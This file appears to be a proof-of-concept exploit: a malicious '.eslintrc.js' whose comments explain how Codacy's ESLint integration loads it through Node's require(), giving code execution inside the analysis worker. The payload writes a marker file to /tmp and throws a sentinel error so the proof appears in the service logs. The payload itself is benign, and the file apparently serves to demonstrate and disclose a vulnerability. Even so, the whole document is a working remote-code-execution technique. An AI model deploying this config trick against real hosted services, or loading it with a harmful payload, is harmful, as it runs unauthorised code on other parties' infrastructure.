// PoC payload — benign marker only. RCE via codacy-eslint: the wrapper sets
// useEslintrc:true (no Codacy patterns) and cwd:/src, so ESLint loads this file
// via loadJSConfigFile -> import-fresh -> Module._compile (Node require()).
// Top-level code below runs during config load inside the Codacy worker, before linting.
// We PROVE code execution by writing a file AND throwing a uniquely-named error so the
// error string appears verbatim in the committed Codacy analysis logs.
var fs = require("fs");
var marker = "/tmp/codacy-eslint-rce-confirmed.txt";
var body = "RCE confirmed via .eslintrc.js load. cwd=" + __dirname + " marker=" + marker + "\n";
try {
  fs.writeFileSync(marker, body);
} catch (e) {}
// Throw a uniquely-named sentinel so the string itself proves our top-level code ran.
throw new Error("CODEX_RCE_ESLINT_PROOF_" + __dirname + "_marker_written_" + marker);
module.exports = { root: true, rules: {} };
